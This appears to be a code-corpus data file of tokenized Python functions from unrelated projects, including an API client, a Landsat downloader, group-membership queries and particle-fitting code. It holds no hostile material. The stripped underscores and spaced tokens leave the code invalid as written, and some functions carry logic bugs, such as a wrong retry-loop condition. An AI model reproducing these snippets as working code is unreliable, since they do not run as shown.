def authenticate ( self ) : auth url = BASE URL + "/auth/token" payload = { 'username' : self . email , 'password' : self . password , 'grant type' : 'password' } arequest = requests . post ( auth url , data = payload , headers = BASIC HEADERS ) status = arequest . status code if status != 200 : LOGGER . error ( "Authentication request failed, please check credintials. " + str ( status ) ) return False response = arequest . json ( ) LOGGER . debug ( str ( response ) ) self . token = response . get ( "access token" ) self . refresh token = response . get ( "refresh token" ) auth = HEADERS . get ( "Authorization" ) auth = auth % self . token HEADERS [ "Authorization" ] = auth LOGGER . info ( "Authentication was successful, token set." ) return True
def models preparing ( app ) : def wrapper ( resource , parent ) : if isinstance ( resource , Declarative Meta ) : resource = List Resource ( resource ) if not getattr ( resource , ' parent ' , None ) : resource . parent = parent return resource resources preparing factory ( app , wrapper )
def translate Commands ( commands ) : for command in commands . split ( ',' ) : # each command results in 2 bytes of binary data result = [ 0 , 0 ] device , command = command . strip ( ) . upper ( ) . split ( None , 1 ) # translate the house code result [ 0 ] = house Codes [ device [ 0 ] ] # translate the device number if there is one if len ( device ) > 1 : device Number = device Numbers [ device [ 1 : ] ] result [ 0 ] |= device Number [ 0 ] result [ 1 ] = device Number [ 1 ] # translate the command result [ 1 ] |= command Codes [ command ] # convert 2 bytes to bit strings and yield them yield ' ' . join ( map ( str Binary , result ) )
def set RTSDTR ( port , RTS , DTR ) : port . set RTS ( RTS ) port . set DTR ( DTR )
def lower ( option , value ) : if type ( option ) is str : option = option . lower ( ) if type ( value ) is str : value = value . lower ( ) return ( option , value )
def to float ( option , value ) : if type ( value ) is str : try : value = float ( value ) except Value Error : pass return ( option , value )
def to bool ( option , value ) : if type ( value ) is str : if value . lower ( ) == 'true' : value = True elif value . lower ( ) == 'false' : value = False return ( option , value )
def fork ( self , name ) : fork = deepcopy ( self ) self [ name ] = fork return fork
def ld to dl ( ld ) : if ld : keys = list ( ld [ 0 ] ) dl = { key : [ d [ key ] for d in ld ] for key in keys } return dl else : return { }
def split list ( l , N ) : npmode = isinstance ( l , np . ndarray ) if npmode : l = list ( l ) g = np . concatenate ( ( np . array ( [ 0 ] ) , np . cumsum ( split integer ( len ( l ) , length = N ) ) ) ) s = [ l [ g [ i ] : g [ i + 1 ] ] for i in range ( N ) ] if npmode : s = [ np . array ( sl ) for sl in s ] return s
def log calls ( function ) : def wrapper ( self , * args , * * kwargs ) : self . log . log ( group = function . name , message = 'Enter' ) function ( self , * args , * * kwargs ) self . log . log ( group = function . name , message = 'Exit' ) return wrapper
def add runtime ( function ) : def wrapper ( * args , * * kwargs ) : pr = c Profile . Profile ( ) pr . enable ( ) output = function ( * args , * * kwargs ) pr . disable ( ) return pr , output return wrapper
def print memory ( function ) : import memory profiler def wrapper ( * args , * * kwargs ) : m = String IO ( ) temp func = memory profiler . profile ( func = function , stream = m , precision = 4 ) output = temp func ( * args , * * kwargs ) print ( m . getvalue ( ) ) m . close ( ) return output return wrapper
def print profile ( function ) : import memory profiler def wrapper ( * args , * * kwargs ) : m = String IO ( ) pr = c Profile . Profile ( ) pr . enable ( ) temp func = memory profiler . profile ( func = function , stream = m , precision = 4 ) output = temp func ( * args , * * kwargs ) print ( m . getvalue ( ) ) pr . disable ( ) ps = pstats . Stats ( pr ) ps . sort stats ( 'cumulative' ) . print stats ( '(?!.*memory profiler.*)(^.*$)' , 20 ) m . close ( ) return output return wrapper
def print runtime ( function ) : def wrapper ( * args , * * kwargs ) : pr = c Profile . Profile ( ) pr . enable ( ) output = function ( * args , * * kwargs ) pr . disable ( ) ps = pstats . Stats ( pr ) ps . sort stats ( 'tot' ) . print stats ( 20 ) return output return wrapper
def get default fields ( self ) : field names = self . meta . get all field names ( ) if 'id' in field names : field names . remove ( 'id' ) return field names
def validate bands ( self , bands ) : if not isinstance ( bands , list ) : logger . error ( 'Parameter bands must be a "list"' ) raise Type Error ( 'Parameter bands must be a "list"' ) valid bands = list ( range ( 1 , 12 ) ) + [ 'BQA' ] for band in bands : if band not in valid bands : logger . error ( '%s is not a valid band' % band ) raise Invalid Band Error ( '%s is not a valid band' % band )
def download ( self , bands , download dir = None , metadata = False ) : super ( Google Downloader , self ) . validate bands ( bands ) pattern = re . compile ( '^[^\s]+ (.+)\.tiff?' , re . I ) image list = [ ] band list = [ 'B%i' % ( i , ) if isinstance ( i , int ) else i for i in bands ] if download dir is None : download dir = DOWNLOAD DIR check create folder ( join ( download dir , self . scene Info . name ) ) filename = "%s%s" % ( self . scene Info . name , self . remote file ext ) downloaded = self . fetch ( self . remote file url , download dir , filename ) try : tar = tarfile . open ( downloaded [ 0 ] , 'r' ) folder path = join ( download dir , self . scene Info . name ) logger . debug ( 'Starting data extraction in directory ' , folder path ) tar . extractall ( folder path ) remove ( downloaded [ 0 ] ) images path = listdir ( folder path ) for image path in images path : matched = pattern . match ( image path ) file path = join ( folder path , image path ) if matched and matched . group ( 1 ) in band list : image list . append ( [ file path , getsize ( file path ) ] ) elif matched : remove ( file path ) except tarfile . Read Error as error : logger . error ( 'Error when extracting files: ' , error ) print ( 'Error when extracting files.' ) return image list
def validate scene Info ( self ) : if self . scene Info . prefix not in self . prefixes Valid : raise Wrong Scene Name Error ( 'AWS: Prefix of %s (%s) is invalid' % ( self . scene Info . name , self . scene Info . prefix ) )
def download ( self , bands , download dir = None , metadata = False ) : super ( AWS Downloader , self ) . validate bands ( bands ) if download dir is None : download dir = DOWNLOAD DIR dest dir = check create folder ( join ( download dir , self . scene Info . name ) ) downloaded = [ ] for band in bands : if band == 'BQA' : filename = '%s %s.%s' % ( self . scene Info . name , band , self . remote file ext ) else : filename = '%s B%s.%s' % ( self . scene Info . name , band , self . remote file ext ) band url = join ( self . base url , filename ) downloaded . append ( self . fetch ( band url , dest dir , filename ) ) if metadata : filename = '%s MTL.txt' % ( self . scene Info . name ) url = join ( self . base url , filename ) self . fetch ( url , dest dir , filename ) return downloaded
def writable path ( path ) : if os . path . exists ( path ) : return os . access ( path , os . W OK ) try : with open ( path , 'w' ) : pass except ( OS Error , IO Error ) : return False else : os . remove ( path ) return True
def writable stream ( handle ) : if isinstance ( handle , io . IO Base ) and sys . version info >= ( 3 , 5 ) : return handle . writable ( ) try : handle . write ( b'' ) except ( io . Unsupported Operation , IO Error ) : return False else : return True
def wait for connection ( self , port ) : connected = False max tries = 10 num tries = 0 wait time = 0.5 while not connected or num tries >= max tries : time . sleep ( wait time ) try : af = socket . AF INET addr = ( '127.0.0.1' , port ) sock = socket . socket ( af , socket . SOCK STREAM ) sock . connect ( addr ) except socket . error : if sock : sock . close ( ) num tries += 1 continue connected = True if not connected : print ( "Error connecting to sphinx searchd" , file = sys . stderr )
def get settings path ( settings module ) : cwd = os . getcwd ( ) settings filename = '%s.py' % ( settings module . split ( '.' ) [ - 1 ] ) while cwd : if settings filename in os . listdir ( cwd ) : break cwd = os . path . split ( cwd ) [ 0 ] if os . name == 'nt' and NT ROOT . match ( cwd ) : return None elif cwd == '/' : return None return cwd
def finalize ( self , result = None ) : if not self . settings path : # short circuit if no settings file can be found return from django . test . utils import teardown test environment from django . db import connection from django . conf import settings self . call plugins method ( 'before Destroy Test Db' , settings , connection ) try : connection . creation . destroy test db ( self . old db , verbosity = self . verbosity , ) except Exception : # If we can't tear down the test DB, don't worry about it. pass self . call plugins method ( 'after Destroy Test Db' , settings , connection ) self . call plugins method ( 'before Teardown Test Env' , settings , teardown test environment ) teardown test environment ( ) self . call plugins method ( 'after Teardown Test Env' , settings )
def update field ( self , poses = None ) : m = np . clip ( self . particle field , 0 , 1 ) part color = np . zeros ( self . image . shape ) for a in range ( 4 ) : part color [ : , : , : , a ] = self . part col [ a ] self . field = np . zeros ( self . image . shape ) for a in range ( 4 ) : self . field [ : , : , : , a ] = m * part color [ : , : , : , a ] + ( 1 - m ) * self . image [ : , : , : , a ]
def remove closest particle ( self , p ) : #1. find closest pos: dp = self . pos - p dist2 = ( dp * dp ) . sum ( axis = 1 ) ind = dist2 . argmin ( ) rp = self . pos [ ind ] . copy ( ) #2. delete self . pos = np . delete ( self . pos , ind , axis = 0 ) return rp
def diffusion ( diffusion constant = 0.2 , exposure time = 0.05 , samples = 200 ) : radius = 5 psfsize = np . array ( [ 2.0 , 1.0 , 3.0 ] ) # create a base image of one particle s0 = init . create single particle state ( imsize = 4 * radius , radius = radius , psfargs = { 'params' : psfsize , 'error' : 1e-6 } ) # add up a bunch of trajectories finalimage = 0 * s0 . get model image ( ) [ s0 . inner ] position = 0 * s0 . obj . pos [ 0 ] for i in xrange ( samples ) : offset = np . sqrt ( 6 * diffusion constant * exposure time ) * np . random . randn ( 3 ) s0 . obj . pos [ 0 ] = np . array ( s0 . image . shape ) / 2 + offset s0 . reset ( ) finalimage += s0 . get model image ( ) [ s0 . inner ] position += s0 . obj . pos [ 0 ] finalimage /= float ( samples ) position /= float ( samples ) # place that into a new image at the expected parameters s = init . create single particle state ( imsize = 4 * radius , sigma = 0.05 , radius = radius , psfargs = { 'params' : psfsize , 'error' : 1e-6 } ) s . reset ( ) # measure the true inferred parameters return s , finalimage , position
def tile overlap ( inner , outer , norm = False ) : div = 1.0 / inner . volume if norm else 1.0 return div * ( inner . volume - util . Tile . intersection ( inner , outer ) . volume )
def translate fourier ( image , dx ) : N = image . shape [ 0 ] f = 2 * np . pi * np . fft . fftfreq ( N ) kx , ky , kz = np . meshgrid ( * ( f , ) * 3 , indexing = 'ij' ) kv = np . array ( [ kx , ky , kz ] ) . T q = np . fft . fftn ( image ) * np . exp ( - 1.j * ( kv * dx ) . sum ( axis = - 1 ) ) . T return np . real ( np . fft . ifftn ( q ) )
def users ( ) : from invenio groups . models import Group , Membership , Privacy Policy , Subscription Policy admin = accounts . datastore . create user ( email = 'admin@inveniosoftware.org' , password = encrypt password ( '123456' ) , active = True , ) reader = accounts . datastore . create user ( email = 'reader@inveniosoftware.org' , password = encrypt password ( '123456' ) , active = True , ) admins = Group . create ( name = 'admins' , admins = [ admin ] ) for i in range ( 10 ) : Group . create ( name = 'group-{0}' . format ( i ) , admins = [ admin ] ) Membership . create ( admins , reader ) db . session . commit ( )
def weight ( self , rsq , sigma = None ) : sigma = sigma or self . filter size if not self . clip : o = np . exp ( - rsq / ( 2 * sigma ** 2 ) ) else : o = np . zeros ( rsq . shape , dtype = 'float' ) m = ( rsq < self . clipsize ** 2 ) o [ m ] = np . exp ( - rsq [ m ] / ( 2 * sigma ** 2 ) ) return o
def eval firstorder ( self , rvecs , data , sigma ) : if not self . blocksize : dist between points = self . distance matrix ( rvecs , self . x ) gaussian weights = self . weight ( dist between points , sigma = sigma ) return gaussian weights . dot ( data ) / gaussian weights . sum ( axis = 1 ) else : # Now rather than calculating the distance matrix all at once, # we do it in chunks over rvecs ans = np . zeros ( rvecs . shape [ 0 ] , dtype = 'float' ) bs = self . blocksize for a in range ( 0 , rvecs . shape [ 0 ] , bs ) : dist = self . distance matrix ( rvecs [ a : a + bs ] , self . x ) weights = self . weight ( dist , sigma = sigma ) ans [ a : a + bs ] += weights . dot ( data ) / weights . sum ( axis = 1 ) return ans
def newcall ( self , rvecs ) : # 1. Initial guess for output: sigma = 1 * self . filter size out = self . eval firstorder ( rvecs , self . d , sigma ) # 2. There are differences between 0th order at the points and #    the passed data, so we iterate to remove: ondata = self . eval firstorder ( self . x , self . d , sigma ) for i in range ( self . iterations ) : out += self . eval firstorder ( rvecs , self . d - ondata , sigma ) ondata += self . eval firstorder ( self . x , self . d - ondata , sigma ) sigma *= self . damp return out
def distance matrix ( self , a , b ) : def sq ( x ) : return ( x * x ) # matrix = np.sum(map(lambda a,b: sq(a[:,None] - b[None,:]), a.T, #   b.T), axis=0) # A faster version than above: matrix = sq ( a [ : , 0 ] [ : , None ] - b [ : , 0 ] [ None , : ] ) for x , y in zip ( a . T [ 1 : ] , b . T [ 1 : ] ) : matrix += sq ( x [ : , None ] - y [ None , : ] ) return matrix
def c2x ( self , c ) : return 0.5 * ( self . window [ 0 ] + self . window [ 1 ] + c * ( self . window [ 1 ] - self . window [ 0 ] ) )
def resolve admin type ( admin ) : if admin is current user or isinstance ( admin , User Mixin ) : return 'User' else : return admin . class . name
def validate ( cls , policy ) : return policy in [ cls . OPEN , cls . APPROVAL , cls . CLOSED ]
def validate ( cls , policy ) : return policy in [ cls . PUBLIC , cls . MEMBERS , cls . ADMINS ]
def validate ( cls , state ) : return state in [ cls . ACTIVE , cls . PENDING ADMIN , cls . PENDING USER ]
def delete ( self ) : with db . session . begin nested ( ) : Membership . query by group ( self ) . delete ( ) Group Admin . query by group ( self ) . delete ( ) Group Admin . query by admin ( self ) . delete ( ) db . session . delete ( self )
def filter ( cls , query , state = Membership State . ACTIVE , eager = None ) : query = query . filter by ( state = state ) eager = eager or [ ] for field in eager : query = query . options ( joinedload ( field ) ) return query
def query by user ( cls , user , * * kwargs ) : return cls . filter ( cls . query . filter by ( user id = user . get id ( ) ) , * * kwargs )
def query invitations ( cls , user , eager = False ) : if eager : eager = [ Membership . group ] return cls . query by user ( user , state = Membership State . PENDING USER , eager = eager )
def query requests ( cls , admin , eager = False ) : # Get direct pending request if hasattr ( admin , 'is superadmin' ) and admin . is superadmin : q1 = Group Admin . query . with entities ( Group Admin . group id ) else : q1 = Group Admin . query by admin ( admin ) . with entities ( Group Admin . group id ) q2 = Membership . query . filter ( Membership . state == Membership State . PENDING ADMIN , Membership . id group . in ( q1 ) , ) # Get request from admin groups your are member of q3 = Membership . query by user ( user = admin , state = Membership State . ACTIVE ) . with entities ( Membership . id group ) q4 = Group Admin . query . filter ( Group Admin . admin type == 'Group' , Group Admin . admin id . in ( q3 ) ) . with entities ( Group Admin . group id ) q5 = Membership . query . filter ( Membership . state == Membership State . PENDING ADMIN , Membership . id group . in ( q4 ) ) query = q2 . union ( q5 ) return query
def query by group ( cls , group or id , with invitations = False , * * kwargs ) : if isinstance ( group or id , Group ) : id group = group or id . id else : id group = group or id if not with invitations : return cls . filter ( cls . query . filter by ( id group = id group ) , * * kwargs ) else : return cls . query . filter ( Membership . id group == id group , db . or ( Membership . state == Membership State . PENDING USER , Membership . state == Membership State . ACTIVE ) )
def create ( cls , group , user , state = Membership State . ACTIVE ) : with db . session . begin nested ( ) : membership = cls ( user id = user . get id ( ) , id group = group . id , state = state , ) db . session . add ( membership ) return membership
def get ( cls , group , admin ) : try : ga = cls . query . filter by ( group = group , admin id = admin . get id ( ) , admin type = resolve admin type ( admin ) ) . one ( ) return ga except Exception : return None
def query by admin ( cls , admin ) : return cls . query . filter by ( admin type = resolve admin type ( admin ) , admin id = admin . get id ( ) )
def query admins by group ids ( cls , groups ids = None ) : assert groups ids is None or isinstance ( groups ids , list ) query = db . session . query ( Group . id , func . count ( Group Admin . id ) ) . join ( Group Admin ) . group by ( Group . id ) if groups ids : query = query . filter ( Group . id . in ( groups ids ) ) return query
def all ( self ) : response = self . api . get ( url = PATHS [ 'GET PROFILES' ] ) for raw profile in response : self . append ( Profile ( self . api , raw profile ) ) return self
def skew ( self , x , z , d = 0 ) : # get the top bound determined by the kurtosis kval = ( np . tanh ( self . poly ( z , self . kurtosis coeffs ( d ) ) ) + 1 ) / 12. bdpoly = np . array ( [ - 1.142468e+04 , 3.0939485e+03 , - 2.0283568e+02 , - 2.1047846e+01 , 3.79808487e+00 , 1.19679781e-02 ] ) top = np . polyval ( bdpoly , kval ) # limit the skewval to be 0 -> top val skew = self . poly ( z , self . skew coeffs ( d ) ) skewval = top * ( np . tanh ( skew ) + 1 ) - top return skewval * ( 3 * x - x ** 3 )
def kurtosis ( self , x , z , d = 0 ) : val = self . poly ( z , self . kurtosis coeffs ( d ) ) return ( np . tanh ( val ) + 1 ) / 12. * ( 3 - 6 * x ** 2 + x ** 4 )
def edit ( self , text , media = None , utc = None , now = None ) : url = PATHS [ 'EDIT' ] % self . id post data = "text=%s&" % text if now : post data += "now=%s&" % now if utc : post data += "utc=%s&" % utc if media : media format = "media[%s]=%s&" for media type , media item in media . iteritems ( ) : post data += media format % ( media type , media item ) response = self . api . post ( url = url , data = post data ) return Update ( api = self . api , raw response = response [ 'update' ] )
def delete ( self ) : url = PATHS [ 'DELETE' ] % self . id return self . api . post ( url = url )
def new ( self , text , shorten = None , now = None , top = None , media = None , when = None ) : url = PATHS [ 'CREATE' ] post data = "text=%s&" % text post data += "profile ids[]=%s&" % self . profile id if shorten : post data += "shorten=%s&" % shorten if now : post data += "now=%s&" % now if top : post data += "top=%s&" % top if when : post data += "scheduled at=%s&" % str ( when ) if media : media format = "media[%s]=%s&" for media type , media item in media . iteritems ( ) : post data += media format % ( media type , media item ) response = self . api . post ( url = url , data = post data ) new update = Update ( api = self . api , raw response = response [ 'updates' ] [ 0 ] ) self . append ( new update ) return new update
def noformat ( self ) : try : formats = { } for h in self . get handlers ( ) : formats [ h ] = h . formatter self . set formatter ( formatter = 'quiet' ) yield except Exception as e : raise finally : for k , v in iteritems ( formats ) : k . formatter = v
def generate sphere ( radius ) : rint = np . ceil ( radius ) . astype ( 'int' ) t = np . arange ( - rint , rint + 1 , 1 ) x , y , z = np . meshgrid ( t , t , t , indexing = 'ij' ) r = np . sqrt ( x * x + y * y + z * z ) sphere = r < radius return sphere
def sphere triangle cdf ( dr , a , alpha ) : p0 = ( dr + alpha ) ** 2 / ( 2 * alpha ** 2 ) * ( 0 > dr ) * ( dr > - alpha ) p1 = 1 * ( dr > 0 ) - ( alpha - dr ) ** 2 / ( 2 * alpha ** 2 ) * ( 0 < dr ) * ( dr < alpha ) return ( 1 - np . clip ( p0 + p1 , 0 , 1 ) )
def tile ( self , n ) : pos = self . trans ( self . pos [ n ] ) return Tile ( pos , pos ) . pad ( self . support pad )
def i2p ( self , ind , coord ) : return '-' . join ( [ self . param prefix , str ( ind ) , coord ] )
def get update tile ( self , params , values ) : doglobal , particles = self . update type ( params ) if doglobal : return self . shape . copy ( ) # 1) store the current parameters of interest values0 = self . get values ( params ) # 2) calculate the current tileset tiles0 = [ self . tile ( n ) for n in particles ] # 3) update to newer parameters and calculate tileset self . set values ( params , values ) tiles1 = [ self . tile ( n ) for n in particles ] # 4) revert parameters & return union of all tiles self . set values ( params , values0 ) return Tile . boundingtile ( tiles0 + tiles1 )
def update ( self , params , values ) : #1. Figure out if we're going to do a global update, in which #   case we just draw from scratch. global update , particles = self . update type ( params ) # if we are doing a global update, everything must change, so # starting fresh will be faster instead of add subtract if global update : self . set values ( params , values ) self . initialize ( ) return # otherwise, update individual particles. delete the current versions # of the particles update the particles, and redraw them anew at the # places given by (params, values) oldargs = self . drawargs ( ) for n in particles : self . draw particle ( self . pos [ n ] , * listify ( oldargs [ n ] ) , sign = - 1 ) self . set values ( params , values ) newargs = self . drawargs ( ) for n in particles : self . draw particle ( self . pos [ n ] , * listify ( newargs [ n ] ) , sign = + 1 )
def param particle ( self , ind ) : ind = self . vps ( listify ( ind ) ) return [ self . i2p ( i , j ) for i in ind for j in [ 'z' , 'y' , 'x' , 'a' ] ]
def param particle pos ( self , ind ) : ind = self . vps ( listify ( ind ) ) return [ self . i2p ( i , j ) for i in ind for j in [ 'z' , 'y' , 'x' ] ]
def param particle rad ( self , ind ) : ind = self . vps ( listify ( ind ) ) return [ self . i2p ( i , 'a' ) for i in ind ]
def update type ( self , params ) : dozscale = False particles = [ ] for p in listify ( params ) : typ , ind = self . p2i ( p ) particles . append ( ind ) dozscale = dozscale or typ == 'zscale' particles = set ( particles ) return dozscale , particles
def tile ( self , n ) : zsc = np . array ( [ 1.0 / self . zscale , 1 , 1 ] ) pos , rad = self . pos [ n ] , self . rad [ n ] pos = self . trans ( pos ) return Tile ( pos - zsc * rad , pos + zsc * rad ) . pad ( self . support pad )
def j2 ( x ) : to return = 2. / ( x + 1e-15 ) * j1 ( x ) - j0 ( x ) to return [ x == 0 ] = 0 return to return
def calc pts hg ( npts = 20 ) : pts hg , wts hg = np . polynomial . hermite . hermgauss ( npts * 2 ) pts hg = pts hg [ npts : ] wts hg = wts hg [ npts : ] * np . exp ( pts hg * pts hg ) return pts hg , wts hg
def oslicer ( self , tile ) : mask = None vecs = tile . coords ( form = 'meshed' ) for v in vecs : v [ self . slicer ] = - 1 mask = mask & ( v > 0 ) if mask is not None else ( v > 0 ) return tuple ( np . array ( i ) . astype ( 'int' ) for i in zip ( * [ v [ mask ] for v in vecs ] ) )
def filtered image ( self , im ) : q = np . fft . fftn ( im ) for k , v in self . filters : q [ k ] -= v return np . real ( np . fft . ifftn ( q ) )
def load image ( self ) : try : image = initializers . load tiff ( self . filename ) image = initializers . normalize ( image , invert = self . invert , scale = self . exposure , dtype = self . float precision ) except IO Error as e : log . error ( "Could not find image '%s'" % self . filename ) raise e return image
def draw ( self ) : if self . display : print ( self . formatstr . format ( * * self . dict ) , end = '' ) sys . stdout . flush ( )
def init app ( self , app ) : self . init config ( app ) app . register blueprint ( blueprint ) app . extensions [ 'invenio-groups' ] = self
def lbl ( axis , label , size = 22 ) : at = Anchored Text ( label , loc = 2 , prop = dict ( size = size ) , frameon = True ) at . patch . set boxstyle ( "round,pad=0.,rounding size=0.0" ) #bb = axis.get yaxis transform() #at = Anchored Text(label, #        loc=3, prop=dict(size=18), frameon=True, #        bbox to anchor=(-0.5,1),#(-.255, 0.90), #        bbox transform=bb,#axis.trans Axes #    ) axis . add artist ( at )
def sim crb diff ( std0 , std1 , N = 10000 ) : a = std0 * np . random . randn ( N , len ( std0 ) ) b = std1 * np . random . randn ( N , len ( std1 ) ) return a - b
def twoslice ( field , center = None , size = 6.0 , cmap = 'bone r' , vmin = 0 , vmax = 1 , orientation = 'vertical' , figpad = 1.09 , off = 0.01 ) : center = center or [ i // 2 for i in field . shape ] slices = [ ] for i , c in enumerate ( center ) : blank = [ np . s [ : ] ] * len ( center ) blank [ i ] = c slices . append ( tuple ( blank ) ) z , y , x = [ float ( i ) for i in field . shape ] w = float ( x + z ) h = float ( y + z ) def show ( field , ax , slicer , transpose = False ) : tmp = field [ slicer ] if not transpose else field [ slicer ] . T ax . imshow ( tmp , cmap = cmap , interpolation = 'nearest' , vmin = vmin , vmax = vmax ) ax . set xticks ( [ ] ) ax . set yticks ( [ ] ) ax . grid ( 'off' ) if orientation . startswith ( 'v' ) : # rect = l,b,w,h log . info ( '{} {} {} {} {} {}' . format ( x , y , z , w , h , x / h ) ) r = x / h q = y / h f = 1 / ( 1 + 3 * off ) fig = pl . figure ( figsize = ( size * r , size * f ) ) ax1 = fig . add axes ( ( off , f * ( 1 - q ) + 2 * off , f , f * q ) ) ax2 = fig . add axes ( ( off , off , f , f * ( 1 - q ) ) ) show ( field , ax1 , slices [ 0 ] ) show ( field , ax2 , slices [ 1 ] ) else : # rect = l,b,w,h r = y / w q = x / w f = 1 / ( 1 + 3 * off ) fig = pl . figure ( figsize = ( size * f , size * r ) ) ax1 = fig . add axes ( ( off , off , f * q , f ) ) ax2 = fig . add axes ( ( 2 * off + f * q , off , f * ( 1 - q ) , f ) ) show ( field , ax1 , slices [ 0 ] ) show ( field , ax2 , slices [ 2 ] , transpose = True ) return fig , ax1 , ax2
def missing particle ( separation = 0.0 , radius = RADIUS , SNR = 20 ) : # create a base image of one particle s = init . create two particle state ( imsize = 6 * radius + 4 , axis = 'x' , sigma = 1.0 / SNR , delta = separation , radius = radius , stateargs = { 'varyn' : True } , psfargs = { 'error' : 1e-6 } ) s . obj . typ [ 1 ] = 0. s . reset ( ) return s , s . obj . pos . copy ( )
def check groups ( s , groups ) : ans = [ ] for g in groups : ans . extend ( g ) if np . unique ( ans ) . size != np . size ( ans ) : return False elif np . unique ( ans ) . size != s . obj get positions ( ) . shape [ 0 ] : return False else : return ( np . arange ( s . obj get radii ( ) . size ) == np . sort ( ans ) ) . all ( )
def find best step ( err vals ) : if np . all ( np . isnan ( err vals ) ) : raise Value Error ( 'All err vals are nans!' ) return np . nanargmin ( err vals )
def reset ( self , new damping = None ) : self . num iter = 0 self . inner run counter = 0 self . J update counter = self . update J frequency self . fresh JTJ = False self . has run = False if new damping is not None : self . damping = np . array ( new damping ) . astype ( 'float' ) self . set err paramvals ( )
def check completion ( self ) : terminate = False term dict = self . get termination stats ( get cos = self . costol is not None ) terminate |= np . all ( np . abs ( term dict [ 'delta vals' ] ) < self . paramtol ) terminate |= ( term dict [ 'delta err' ] < self . errtol ) terminate |= ( term dict [ 'exp err' ] < self . exptol ) terminate |= ( term dict [ 'frac err' ] < self . fractol ) if self . costol is not None : terminate |= ( curcos < term dict [ 'model cosine' ] ) return terminate
def update J ( self ) : self . calc J ( ) # np.dot(j, j.T) is slightly faster but 2x as much mem step = np . ceil ( 1e-2 * self . J . shape [ 1 ] ) . astype ( 'int' ) # 1% more mem... self . JTJ = low mem sq ( self . J , step = step ) #copies still, since J is not C -ordered but a slice of j e... #doing self.J.copy() works but takes 2x as much ram.. self . fresh JTJ = True self . J update counter = 0 if np . any ( np . isnan ( self . JTJ ) ) : raise Floating Point Error ( 'J, JTJ have nans.' ) #Update self. exp err self . exp err = self . error - self . find expected error ( delta params = 'perfect' )
def calc grad ( self ) : residuals = self . calc residuals ( ) return 2 * np . dot ( self . J , residuals )
def update Broyden J ( self ) : CLOG . debug ( 'Broyden update.' ) delta vals = self . param vals - self . last vals delta residuals = self . calc residuals ( ) - self . last residuals nrm = np . sqrt ( np . dot ( delta vals , delta vals ) ) direction = delta vals / nrm vals = delta residuals / nrm self . rank 1 J update ( direction , vals ) self . JTJ = np . dot ( self . J , self . J . T )
def update eig J ( self ) : CLOG . debug ( 'Eigen update.' ) vls , vcs = np . linalg . eigh ( self . JTJ ) res0 = self . calc residuals ( ) for a in range ( min ( [ self . num eig dirs , vls . size ] ) ) : #1. Finding stiff directions stif dir = vcs [ - ( a + 1 ) ] #already normalized #2. Evaluating derivative along that direction, we'll use dl=5e-4: dl = self . eig dl #1e-5 = self . update function ( self . param vals + dl * stif dir ) res1 = self . calc residuals ( ) #3. Updating grad stif = ( res1 - res0 ) / dl self . rank 1 J update ( stif dir , grad stif ) self . JTJ = np . dot ( self . J , self . J . T ) #Putting the parameters back: = self . update function ( self . param vals )
def calc J ( self ) : del self . J self . J = np . zeros ( [ self . param vals . size , self . data . size ] ) dp = np . zeros like ( self . param vals ) f0 = self . model . copy ( ) for a in range ( self . param vals . size ) : dp *= 0 dp [ a ] = self . dl [ a ] f1 = self . func ( self . param vals + dp , * self . func args , * * self . func kwargs ) grad func = ( f1 - f0 ) / dp [ a ] #J = grad(residuals) = -grad(model) self . J [ a ] = - grad func
def update function ( self , param vals ) : self . model = self . func ( param vals , * self . func args , * * self . func kwargs ) d = self . calc residuals ( ) return np . dot ( d . flat , d . flat )
def update function ( self , param vals ) : self . opt obj . update function ( param vals ) return self . opt obj . get error ( )
def calc J ( self ) : r0 = self . state . residuals . copy ( ) . ravel ( ) dl = np . zeros ( self . param vals . size ) p0 = self . param vals . copy ( ) J = [ ] for a in range ( self . param vals . size ) : dl *= 0 dl [ a ] += self . dl self . update function ( p0 + dl ) r1 = self . state . residuals . copy ( ) . ravel ( ) J . append ( ( r1 - r0 ) / self . dl ) self . update function ( p0 ) return np . array ( J )
def calc grad ( self ) : if self . fresh JTJ : return self . graderr else : residuals = self . calc residuals ( ) return 2 * np . dot ( self . J , residuals )
def do run ( self , mode = '1' ) : for a in range ( len ( self . particle groups ) ) : group = self . particle groups [ a ] lp = LM Particles ( self . state , group , * * self . kwargs ) if mode == 'internal' : lp . J , lp . JTJ , lp . dif tile = self . load j diftile ( a ) if mode == '1' : lp . do run 1 ( ) if mode == '2' : lp . do run 2 ( ) if mode == 'internal' : lp . do internal run ( ) self . stats . append ( lp . get termination stats ( get cos = self . get cos ) ) if self . save J and ( mode != 'internal' ) : self . dump j diftile ( a , lp . J , lp . dif tile ) self . has saved J [ a ] = True
def do internal run ( self ) : if not self . save J : raise Runtime Error ( 'self.save J=True required for do internal run()' ) if not np . all ( self . has saved J ) : raise Runtime Error ( 'J, JTJ have not been pre-computed. Call do run 1 or do run 2' ) self . do run ( mode = 'internal' )
def reset ( self , * * kwargs ) : self . aug state . reset ( ) super ( LM Augmented State , self ) . reset ( * * kwargs )
def model to data ( self , sigma = 0.0 ) : im = self . model . copy ( ) im += sigma * np . random . randn ( * im . shape ) self . set image ( util . Null Image ( image = im ) )
def get ( self , name ) : for c in self . comps : if c . category == name : return c return None
def calc loglikelihood ( self , model = None , tile = None ) : if model is None : res = self . residuals else : res = model - self . data [ tile . slicer ] sig , isig = self . sigma , 1.0 / self . sigma nlogs = - np . log ( np . sqrt ( 2 * np . pi ) * sig ) * res . size return - 0.5 * isig * isig * np . dot ( res . flat , res . flat ) + nlogs
def trigger update ( self , params , values ) : if self . parent : self . parent . trigger update ( params , values ) else : self . update ( params , values )
def get ( self ) : fields = [ c . get ( ) for c in self . comps ] return self . field reduce func ( fields )
def set shape ( self , shape , inner ) : for c in self . comps : c . set shape ( shape , inner )
def sync params ( self ) : def normalize ( comps , param ) : vals = [ c . get values ( param ) for c in comps ] diff = any ( [ vals [ i ] != vals [ i + 1 ] for i in range ( len ( vals ) - 1 ) ] ) if diff : for c in comps : c . set values ( param , vals [ 0 ] ) for param , comps in iteritems ( self . lmap ) : if isinstance ( comps , list ) and len ( comps ) > 1 : normalize ( comps , param )
def read environment ( ) : out = { } for k , v in iteritems ( os . environ ) : if transform ( k ) in default conf : out [ transform ( k ) ] = v return out
def get group name ( id group ) : group = Group . query . get ( id group ) if group is not None : return group . name
